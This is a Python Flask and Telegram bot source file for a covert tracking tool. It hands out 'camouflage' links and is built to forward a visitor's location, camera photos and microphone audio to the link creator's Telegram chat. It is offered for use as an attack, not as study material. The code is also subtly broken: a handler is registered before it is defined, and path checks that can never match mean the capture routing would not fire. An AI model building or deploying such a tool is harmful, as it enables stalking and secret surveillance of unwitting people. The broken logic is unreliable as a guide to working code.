import os, base64, tempfile, asyncio
from flask import Flask, request, render_template, jsonify
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes

app = Flask(__name__)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise Exception("BOT_TOKEN missing")

bot = Bot(token=BOT_TOKEN)
from database import create_session, get_chat_id

def send_to_telegram(chat_id, data_type, content):
    if data_type == "location":
        lat, lon, acc = content["lat"], content["lon"], content["acc"]
        bot.send_message(chat_id, f"📍 Location: {lat}, {lon}\nAccuracy: {acc}m")
    elif data_type == "photo":
        header, encoded = content.split(",", 1)
        img_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".jpg", delete=False) as f:
            f.write(img_data)
            tmp = f.name
        with open(tmp, "rb") as f:
            bot.send_photo(chat_id, f)
        os.unlink(tmp)
    elif data_type == "audio":
        header, encoded = content.split(",", 1)
        audio_data = base64.b64decode(encoded)
        with tempfile.NamedTemporaryFile(suffix=".webm", delete=False) as f:
            f.write(audio_data)
            tmp = f.name
        with open(tmp, "rb") as f:
            bot.send_audio(chat_id, f)
        os.unlink(tmp)

@app.route('/camouflage')
def camouflage():
    session_id = request.args.get('session')
    if not session_id or not get_chat_id(session_id):
        return "Invalid link", 404
    return render_template('camouflage.html')

@app.route('/track', methods=['POST'])
def track():
    session_id = request.args.get('session')
    chat_id = get_chat_id(session_id)
    if not chat_id:
        return jsonify({"error": "Invalid session"}), 400
    data = request.get_json()
    path = request.path
    if '/location' in path:
        send_to_telegram(chat_id, "location", data)
    elif '/photo' in path:
        send_to_telegram(chat_id, "photo", data.get("image"))
    elif '/audio' in path:
        send_to_telegram(chat_id, "audio", data.get("audio"))
    return jsonify({"status": "ok"})

# Bot webhook setup
application = Application.builder().token(BOT_TOKEN).build()
application.add_handler(CommandHandler("start", start))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    session_id = create_session(chat_id)
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
    link = f"{public_url}/camouflage?session={session_id}"
    await update.message.reply_text(f"✅ Link ready:\n{link}")

@app.route('/webhook', methods=['POST'])
async def webhook():
    json_str = request.get_data(as_text=True)
    update = Update.de_json(json_str, bot)
    await application.process_update(update)
    return "ok"

# Set webhook on startup
def set_webhook():
    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://clahac.onrender.com")
    webhook_url = f"{public_url}/webhook"
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(application.bot.set_webhook(webhook_url))
    loop.close()

set_webhook()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
